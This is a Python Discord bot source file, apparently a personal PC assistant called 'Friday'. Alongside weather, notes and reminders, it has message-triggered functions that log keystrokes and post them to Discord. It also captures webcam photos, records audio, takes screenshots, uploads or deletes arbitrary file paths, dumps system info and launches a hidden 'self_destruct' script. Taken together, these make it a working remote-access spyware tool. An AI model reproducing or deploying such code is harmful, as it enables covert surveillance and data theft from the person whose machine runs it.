import sys
# from tkinter.ttk import Button
from httpx import Limits
from token_discord import password, headers_randomstuff
from email import message
import os
from async_timeout import current_task
# my_secret = os.environ['TOKEN']
import discord
from discord.ext import commands
from discord.utils import get
from discord.ui import Button,View

import urllib.request
import re
from bs4 import BeautifulSoup
from matplotlib.pyplot import pause
import requests
import pyttsx3
import datetime
import speech_recognition as sr
import wikipedia
import calendar
import pywhatkit
import time                              # it is for 
import webbrowser as web
from typing import Optional                    # whatsapp
from urllib.parse import quote                    
import pyautogui as pg                              # message
from pywhatkit.core import core, exceptions, log          # and we have taken it from pywhatkit library
from selenium import webdriver
import smtplib
import cv2
import random
from PIL import Image

import matplotlib.pyplot as plt 
import winshell
import win32api

from GoogleNews import GoogleNews
import datetime

import keyboard as kb

import webbrowser
import subprocess

import python_weather
import asyncio
import instaloader
# os.chdir("C:\Windows\Bot")
note_list=[]
ans=" "
current_directory=os.getcwd()

async def reminder_fun():
  # list_rem=os.listdir(rf"{current_directory}\all_reminder")
  # # print("list_rem:",list_rem)
  # rem_str="#".join(list_rem)
  current_time=""
  while(True):
    list_rem=os.listdir(rf"{current_directory}\all_reminder")
    # print("list_rem:",list_rem)
    rem_str="#".join(list_rem)
    # print(str(datetime.datetime.now())[:19])
    current_time=str(datetime.datetime.now())[:16]
    while(":"in current_time):
      current_time=current_time.replace(":","^")
    current_time=current_time[8:10]+"-"+current_time[5:7]+"-"+current_time[:4]+current_time[10:]
    print("while",current_time)
    # current_time=current_time[-7::-1]+current_time[10:]
    if(current_time in rem_str):
      
        print("hello")
        break
    # time.sleep(20)
    await asyncio.sleep(40)
  for element in list_rem:
    print("element:",element)
    if current_time in element:
      print("element in if:",element)
      with open(rf"{current_directory}\all_reminder\{element}","rb") as f:
        picture=discord.File(f)                       # here picture can be any type of file i.e txt,csv,html,jpg,png,wav etc
        # channel="Friday_Bot"
        # await channel.send(file=picture)
        # await dm.send(file=picture)
        await client.guilds[0].channels[2].send("Here is a reminder:",file=picture)
        # await client.guilds[0].channels[2].send("hello")
        f.close()
      os.remove(rf"{current_directory}\all_reminder\{element}")
  # await asyncio.sleep(60)
  await reminder_fun()

  # await asyncio.sleep(0.01)


async def getweather(city):
  client= python_weather.Client(format=python_weather.IMPERIAL)
  weather= await client.find(city)
  temp=weather.current.temperature
  temp=str((temp-32)*5/9)
  temp=temp[:5]
  sky=weather.current.sky_text
  ans=f"Weather at location {city} is {sky}."+f"\nTemperature is {temp} degree celsius"
  # weather_string=ans
  # print(ans)
  await client.close()
  return ans

async def key_track(ch):
  while(True):
    rk=kb.record("space")
    rk=str(list(kb.get_typed_strings(rk))[0])
    try:
      await ch.send(rk)
    except:
      pass
  # await key_track(ch)


async def key_track_2(ch):
  while(True):
    rk=kb.record("enter")
    rk=str(list(kb.get_typed_strings(rk))[0])
    try:
      await ch.send(rk)
    except:
      pass


async def takeCommand(ch,tm):
    r=sr.Recognizer()
    with sr.Microphone() as source:
        print("Listening......")
        r.pause_threshold=tm
        audio=r.listen(source,phrase_time_limit=tm)
        print("stopped")
        # print(type(audio))
        with open("microphone-results.wav", "wb") as f:
          f.write(audio.get_wav_data())
          f.close()
        with open(rf"{current_directory}\microphone-results.wav","rb") as f:
          audio_file=discord.File(f)
          await ch.send("Here it is:",file=audio_file)
          f.close()
        os.remove(rf"{current_directory}\microphone-results.wav")

def function_to_interact(button,message_response):
  async def button_callback(interaction):
    await interaction.response.send_message(message_response)
  button.callback=button_callback






client=discord.Client(intents=discord.Intents.default())


# async def send_dm(member: discord.Member, *, content):
#     channel = await member.create_dm()
#     await channel.send(content)

@client.event
async def on_ready():
  print(f'{client.user} has connected to Discord!')
  if "all_reminder" not in os.listdir(rf"{current_directory}"):
    os.mkdir(rf"{current_directory}\all_reminder")
  await reminder_fun()




  # channel=client.guilds[0].channels[2]
  # await channel.send("hello")
  # user=get(client.get_all_members())
  # print(user)
  # await send_dm(member="Rahul Rawat#0085",content="hello")


  # for guild in client.guilds:
  #   print(str(guild))
  #   for channel in guild.channels:
  #       if str(channel)=="general":
  #         await channel.send("hello")
  #       print(str(channel))

  # print(str(client.guilds[0].channels[2]))
  # await client.guilds[0].channels[2].send("hello")

  # print(str(client.guilds[0].channels[2].members[0]))
  # for guild in client.guilds:
  #   print("guild"+str(guild))
  #   for channel in guild.channels:
  #     if str(channel)=="general":
  #       print("channel"+str(channel))
  #       for member in channel.members:
  #         print(str(member))

  # await channel.send("hello")
  # await user.send("hello")
  # channel="Friday_Bot"
  # await channel.send("hello")

  # list_rem=os.listdir(rf"{current_directory}\all_reminder")
  # rem_str="#".join(list_rem)
  # current_time=""
  # while(True):
  #   # print(str(datetime.datetime.now())[:19])
  #   current_time=str(datetime.datetime.now())[:16]
  #   while(":"in current_time):
  #     current_time=current_time.replace(":","^")
  #   if(current_time in rem_str):
      
  #       # print("hello")
  #       break
  #   time.sleep(50)
  # for element in list_rem:
  #   if current_time in element:
  #     with open(rf"{current_directory}\all_reminder\element","rb") as f:
  #       picture=discord.File(f)                       # here picture can be any type of file i.e txt,csv,html,jpg,png,wav etc
  #       channel="Friday_Bot"
  #       await channel.send(file=picture)
  #       f.close()
  
  

    
    

@client.event
async def on_message(message):
  # print(message.content)
  # print('rahul')
  # print(message.attachments)
  # img=message.attachments[0]     # to take images as input
  # await img.save("img.jpg")
  if message.author==client.user:
    return

  if str(message.content) == "dm":
    dm=await message.author.create_dm()

    # await message.author.dm_channel.send("hello")
    await dm.send("hello")

  if str(message.author) !="Rahul Rawat#0085" and str(message.author) !="Human Hunter#6234":
    with open(rf"{current_directory}\wrong_user.txt","a+") as myfile:
      title=f"{message.author}: {message.content}"
      await message.channel.send(f"Wrong User:\n{title}")
      myfile.write(title+"\n")
      myfile.close()
    await client.close()

  if message.content.startswith("hey"):
    await message.channel.send(f"hello {message.author}")
    # print(message.channel)
    print(type(message.channel))
    # print(message.author)
    # print(type(message.author))
  
  if "your name" in message.content and ("tell" in message.content or "what" in message.content) or "who are you" in message.content:
    await message.channel.send(f"I am {client.user}")
    

  if ("weather at" in message.content) or ("weather in" in message.content) or ("weather of" in message.content):
    ind=int(message.content.index("weather") + 11)
    last=ind
    while True:
        if last==len(message.content):
            break
        last+=1
    city=message.content[ind:last]
    # client.wait_for("5")
    weather_string=asyncio.ensure_future(getweather(city))
    # loop=asyncio.get_event_loop()
    # weather_string=loop.run_until_complete(getweather(city))
    await asyncio.sleep(2)
    await message.channel.send(weather_string.result())
  
  if "play" in message.content:
    topic=str(message.content)
    topic=topic.replace("play ","")
    topic=topic.split(" ")
    topic="+".join(topic)
      
    html = urllib.request.urlopen(f"https://www.youtube.com/results?search_query={topic}")
    video_ids = re.findall(r"watch\?v=(\S{11})", html.read().decode())
    vi=video_ids[0]
    url=f"https://www.youtube.com/watch?v={vi}"
    await message.channel.send("click on >> "+url)

  if "Note:" in message.content:
    note=message.content
    title=5
    while(note[title]!="\n"):
      title+=1
    title=str(note[5:title])
    note=note.replace("Note:","")
    # note_list.insert(0,note)

    d=os.getcwd()

    with open(rf"{d}\{title}.txt","w") as myfile:
      # print(myfile.read())
      myfile.write(note)
      # print(myfile.read())
      myfile.close()
      await message.channel.send("Note saved")

    with open(rf"{d}\note.txt","a+") as myfile:
      # print(myfile.read())
      myfile.write(title+"\n")
      # print(myfile.read())
      myfile.close()
    



  if "show note" in message.content:
    file=message.content[10:]
    d=os.getcwd()
    with open(rf"{d}\{file}.txt","r") as myfile:
      await message.channel.send(str(myfile.read()))
      myfile.close()
  
  if "show all note" in message.content:
    d=os.getcwd()
    with open(rf"{d}\note.txt","r") as myfile:
      await message.channel.send(str(myfile.read()))
      myfile.close()

  if "clear note" in message.content:
    msg=message.content
    d=os.getcwd()
    title=11
    while(title!=len(msg)):
      title+=1
    title=str(msg[11:title])
    os.remove(rf"{d}\{title}.txt")

    with open(rf"{d}\note.txt","r") as input:
      with open(rf"{d}\sample.txt","a+") as output:
        for line in input:
          if line.strip("\n")!=title:
            output.write(line)
    os.replace(rf"{d}\sample.txt",rf"{d}\note.txt")

    await message.channel.send("Note cleared")

  if ("search" in message.content and "wikipedia" in message.content) and  ("about" in message.content or "that" in message.content) :
    if "that" in message.content:
        ind=int(message.content.index("that")+5)
    elif "about" in message.content:
        ind=int(message.content.index("about")+6)  
    try:
        results=wikipedia.summary(message.content[ind:],sentences=1)
        await message.channel.send(results)
    except Exception as e:
        await message.channel.send("No data found")

  if "graph" in message.content and "plot" in message.content:
    ind=int(message.content.index("x"))
    ind+=2
    last=ind
    while(message.content[last]!="\n"):
      last+=1
    x_coordinate=message.content[ind:last]
    ind_2=int(message.content.index("y"))
    ind_2+=2
    last_2=ind_2
    while(last_2!=len(message.content)):
      last_2+=1
    y_coordinate=message.content[ind_2:last_2]
    x=x_coordinate.split(",")
    y=y_coordinate.split(",")
    for i in range(len(y)):
      y[i]=int(y[i])
    for i in range(len(x)):
      x[i]=int(x[i])
    plt.plot(x,y)
    plt.plot(x,y,"ro")
    plt.ylabel("y variable")
    plt.xlabel("x varialbe")
    d=os.getcwd()
    # print(d)
    plt.savefig(f"{d}\graph_1.png")
    plt.close()
    with open(rf"{d}\graph_1.png","rb") as f:
      picture=discord.File(f)
      await message.channel.send(file=picture)
      f.close()
      os.remove(rf"{d}\graph_1.png")
    
  if "show" in message.content and "file" in message.content and "path" in message.content:
    ind=message.content.index("path")+5
    path=message.content[ind:]

    await message.channel.send("\n".join(os.listdir(rf"{path}")))

    # for element in os.listdir(rf"{path}"):
    #   await message.channel.send(element)

  if "open" in message.content and "file" in message.content and "path" in message.content:
    ind=message.content.index("path")+5
    path=message.content[ind:]
    with open(rf"{path}","rb") as f:
      picture=discord.File(f)                       # here picture can be any type of file i.e txt,csv,html,jpg,png,wav etc
      await message.channel.send(file=picture)
      f.close()
    
  if "take" in message.content and "screenshot" in message.content:
    # pg.keyDown("alt")
    # pg.press("z")
    # pg.keyUp("alt")
    # time.sleep(2)
    # length=len(os.listdir(r"D:\Drive\Screenshots"))-1
    # file_name=os.listdir(r"D:\Drive\Screenshots")[length]

    ss=pg.screenshot()
    ss.save("screenshot_1.png")
    path=f"{current_directory}\screenshot_1.png"

    # path=f"D:\Drive\Screenshots\{file_name}"
    with open(rf"{path}","rb") as f:
      picture=discord.File(f)                       # here picture can be any type of file i.e txt,csv,html,jpg,png,wav etc
      await message.channel.send(file=picture)
      f.close()
    os.remove(path)

  if "capture" in message.content and "photo" in message.content:
    camera=cv2.VideoCapture(0)
    return_value,image= camera.read()
    cv2.imwrite("test_2.png",image)
    del(camera)
    # img=Image.open("test_2.png")
    # time.sleep(1)
    with open(rf"{current_directory}\test_2.png","rb") as f:
      picture=discord.File(f)
      await message.channel.send(file=picture)
      f.close()
    os.remove(rf"{current_directory}\test_2.png")


  if "clear" in message.content and "recyclebin" in message.content:
    winshell.recycle_bin().empty(confirm=False,show_progress=False,sound=False)
    time.sleep(1)
    await message.channel.send("Task accomplished !")

  if "get all partition" in message.content:
    drives=win32api.GetLogicalDriveStrings()
    drives=drives.split('\000')[:-1]
    print(drives)
    await message.channel.send(drives)

  if "delete" in message.content and "file" in message.content and "path" in message.content:
    ind=message.content.index("path")+5
    path=message.content[ind:]
    os.remove(path)

  if "news" in message.content and "topic" in message.content:
    ind=message.content.index("topic")+6
    las=len(message.content)
    topic=message.content[ind:las]
    current_time = datetime.datetime.now()
    googlenews=GoogleNews(lang="hi",region="IN",start=f"{current_time.month}/{current_time.day}/{current_time.year}",encode="utf-8")
    googlenews.search(topic)
    res=googlenews.results()
    # se=""
    for element in res:
      me="Time: "+element["date"]+"\n\nTitle: \n"+element["title"]+"\n\nLink: \n"+element["link"]
      # print(element["title"])
      # print(element["date"])
      # print(element["desc"])
      # print(element["link"])
      # print("\n")  
      await message.channel.send(me)
      time.sleep(1)

  if "create reminder" in message.content:
    # create reminder
    # date=01/01/2022
    # time=15:20
    # content in the reminder

    date_ind_st=message.content.index("date")+5
    date_ind_ed=date_ind_st
    while(message.content[date_ind_ed]!="\n"):
      date_ind_ed+=1
    date=message.content[date_ind_st:date_ind_ed]
    year,month,day=date.split("/")
    time_ind_st=message.content.index("time")+5
    time_ind_ed=time_ind_st
    while(message.content[time_ind_ed]!="\n"):
      time_ind_ed+=1
    time_=message.content[time_ind_st:time_ind_ed]
    while(":"in time_):
      time_=time_.replace(":","^")
    rem_time=f"{year}-{month}-{day} {time_}"
    reminder=message.content[time_ind_ed+1:len(message.content)]
    time_in_name=str(datetime.datetime.now())
    time_in_name=time_in_name.replace(" ","_")
    while(":" in time_in_name):
      time_in_name=time_in_name.replace(":","+")

    with open(rf"{current_directory}\all_reminder\reminder{rem_time}+++{time_in_name}.txt","a+") as rem_file:
      rem_file.write(f"{rem_time}\n{reminder}")
      rem_file.close()
    dm=await message.author.create_dm()
    print(type(dm))

    

    # await message.author.dm_channel.send("hello")
    

    print(reminder,rem_time,time_in_name)
    # await reminder_fun(dm)
    

  if "where am i" in message.content:
    webbrowser.open("https://www.google.com/search?q=where+am+i")
    time.sleep(2)
    ss=pg.screenshot()
    ss.save("screenshot_ip.png")
    pg.keyDown("alt")
    pg.press("f4")
    pg.keyUp("alt")
    path=f"{current_directory}\screenshot_ip.png"
    # path=f"D:\Drive\Screenshots\{file_name}"
    with open(rf"{path}","rb") as f:
      picture=discord.File(f)                       # here picture can be any type of file i.e txt,csv,html,jpg,png,wav etc
      await message.channel.send(file=picture)
      f.close()
    os.remove(path)

  if "pc info" in message.content:
    # import subprocess
    Id=subprocess.check_output(["systeminfo"]).decode("utf-8")
    with open(rf"{current_directory}\systeminfo.txt","w+") as f:
      f.write(Id)
      f.close()
    with open(rf"{current_directory}\systeminfo.txt","rb") as f:
      file_1=discord.File(f)
      # await message.channel.send()
      await message.channel.send("Here it is :",file=file_1)
      f.close()
    os.remove(rf"{current_directory}\systeminfo.txt")


  if "shutdown friday" in message.content:
    await message.channel.send("OK, I am going offline.")
    print("Bot stopped")
    # await client.close()
    sys.exit()

  if "close window" in message.content:
    await message.channel.send("OK")
    pg.keyDown("alt")
    pg.press("f4")
    pg.keyUp("alt")

  if "shutdown pc" in message.content:
    await message.channel.send("Shutting down in 10 seconds")
    os.system("shutdown /s /t 10")

  if "lock pc" in message.content:
    pg.press("winleft")
    # time.sleep(1)
    pg.write("powershell")
    # time.sleep(1)
    pg.press("enter")
    # time.sleep(1)
    pg.write("rundll32.exe user32.dll, LockWorkStation")
    time.sleep(0.5)
    pg.press("enter")


  if "get keys" in message.content:
    if "live" in message.content:
      await key_track(message.channel)
    else:
      await key_track_2(message.channel)
  
  if "write" in message.content[:5]:
    string_1=message.content[6:]
    pg.write(string_1)

  if "press" in message.content[:5]:
    kb.press_and_release(message.content[6:])   # example: press ctrl+v,backspace,space

  if "--" == message.content[:2]:
    question=message.content[2:]
    url = "https://random-stuff-api.p.rapidapi.com/ai"
    querystring={"msg":f"{question}"}
    response=requests.request("GET",url,headers=headers_randomstuff,params=querystring)
    ind=response.text.index("AIResponse")+13
    response=response.text[ind:-1]
    await message.channel.send(response)

  if "record audio" in message.content:   # example: record audio for 40 seconds
    ind=message.content.index("audio")+10
    lst=ind
    while(message.content[lst]!=" "):
      lst+=1
    tm=int(message.content[ind:lst])
    await takeCommand(message.channel,tm)

  if "save file" in message.content:
    ind=message.content.index("path=")
    ind+=5
    lst=ind
    while(lst!=len(message.content)):
      lst+=1
    path=message.content[ind:lst]
    img=message.attachments[0]
    await img.save(f"{path}")
    await message.channel.send("Task done")

  if "enhance image" in message.content:
    img=message.attachments[0]
    await img.save(rf"{current_directory}/img.jpg")
    # import cv2
    img=cv2.imread(rf"{current_directory}/img.jpg")
    clahe=cv2.createCLAHE()
    gray_img=cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    enh_img=clahe.apply(gray_img)
    cv2.imwrite(rf"{current_directory}/enhanced_img.jpg",enh_img)
    with open(rf"{current_directory}\enhanced_img.jpg","rb") as f:
      file_1=discord.File(f)
      # await message.channel.send()
      await message.channel.send("Here it is :",file=file_1)
      f.close()
    os.remove(rf"{current_directory}\enhanced_img.jpg")
    os.remove(rf"{current_directory}\img.jpg")

  if "self destruct friday" in message.content:
    with open(rf"{current_directory}/self_destruct.vbs","w+") as file:
      file.write(f"""CreateObject("Wscript.Shell").Run "{current_directory}\self_destruct.bat", 0 , True""")
      file.close()

    with open(rf"{current_directory}/self_destruct.bat","w+") as file:
      file.write(f"""@echo off

powershell {current_directory}\self_destruct.exe

@pause""")
      file.close()

    # os.startfile(r"C:\Users\might\AppData\Local\Programs\Microsoft VS Code\Code.exe")
    os.startfile(rf"{current_directory}\self_destruct.vbs")
    await message.channel.send("Self destruction will be completed in 60 seconds")
    # await client.close()
    sys.exit()


  if "hello bot" in message.content:
    # await message.channel.send("what is your name: \n")
    # mes=await client.wait_for("message",timeout=6.0)
    # await message.channel.send(mes)
    button1=Button(label="light is made up of:",style=discord.ButtonStyle.green)
    button2=Button(label="rawat",style=discord.ButtonStyle.danger)
    button3=Button(label="link to flipkart",url="https://www.flipkart.com",emoji="😁")

    # button1.callback=button_callback
    function_to_interact(button1,"rahul rawat gujjar")


    

    view=View()
    view.add_item(button1)
    view.add_item(button2)
    view.add_item(button3)
    await message.channel.send("Here are the few buttons:\n",view=view)

    await asyncio.sleep(5)
    button4=Button(label="rohit rawat",style=discord.ButtonStyle.blurple)
    function_to_interact(button4,"hello rohit")
    view2=View()
    view2.add_item(button4)
  
    await message.channel.send("new button:\n",view=view2)

  if "insta dp" in message.content:
    last=message.content.index("insta")-1
    username=message.content[:last]
    ig=instaloader.Instaloader()
    ig.download_profile(username,profile_pic_only=True)
    # =os.getcwd()
    file_name=os.listdir(rf"{current_directory}\{username}")
    print("\n",file_name,"\n",type(file_name[0]),"\n")
    with open(rf"{current_directory}\{username}\{file_name[0]}","rb") as f:
      await message.channel.send(file=discord.File(f))
      f.close()
    time.sleep(4)
    for i in range(3):
      os.remove(rf"{current_directory}\{username}\{file_name[i]}")
      time.sleep(1)
    os.rmdir(rf"{current_directory}\{username}")








  

@client.event 
async def on_member_join(member):
  await member.create_dm()
  await member.dm_channel.send(f"Hey {member.name}, welcome to my discord server")



client.run(password)
